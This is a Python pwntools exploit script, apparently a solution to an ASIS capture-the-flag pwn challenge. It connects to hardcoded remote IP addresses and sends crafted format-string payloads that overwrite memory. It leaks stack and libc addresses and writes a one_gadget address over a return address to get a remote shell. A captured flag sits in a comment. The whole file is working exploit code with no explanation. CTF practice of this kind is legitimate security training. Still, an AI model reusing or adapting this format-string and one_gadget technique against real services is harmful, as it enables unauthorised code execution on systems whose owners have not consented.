#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.6"
#port = 8888
#host = "146.185.168.172"
#host= "178.62.249.106"
#ASIS{You_ar3_G0ing_to_be_m4st3r_s0o0on!}
host = "146.185.168.172"
port = 54519


def fmtchar(prev_word,word,index,byte = 1):
    fmt = ""
    if word - prev_word > 0 :
        result = word - prev_word 
        fmt += "%" + str(result) + "c"
    elif word == prev_word :
        result = 0
    else :
        result = 256**byte - prev_word + word
        fmt += "%" + str(result) + "c"
    if byte == 2 :
        fmt += "%" + str(index) + "$hn"
    elif byte == 4 :
        fmt += "%" + str(index) + "$n"
    else :
        fmt += "%" + str(index) + "$hhn"
    return fmt

r = remote(host,port)
r.recvuntil("2010")
context.arch ="amd64"
start = 0x4005e0
buf = 0x601018
fini_array = 0x600de0
payload = ""
prev = 0
payload += fmtchar(prev,start >> 16,17)
prev = start >> 16
payload += fmtchar(prev,start & 0xffff,18,2)
prev = start & 0xffff
# Write to link_map
# It will be used in _dl_fini
payload += fmtchar(prev,buf - fini_array,40,2) 
payload += "#%20$p#%23$p#"
payload = payload.ljust(72,"a")  + p64(buf+2) + p64(buf)
r.sendline(payload)
r.recvuntil("\n")
r.recvuntil("#")
stack = int(r.recvuntil("#")[:-1],16)
print "stack",hex(stack)
libc = int(r.recvuntil("#")[:-1],16) - 0x20830
print "libc",hex(libc)
magic = libc + 0xf1117
ret = stack - 0x2b8
p = flat([ret,ret+1,ret+2])
payload = ""
prev = 0
for i in range(3):
    payload += fmtchar(prev,(magic >> i*8) & 0xff,17+i)
    prev = (magic >> i*8) & 0xff
payload = payload.ljust(72,"a")  + p
r.sendline(payload)
r.interactive()
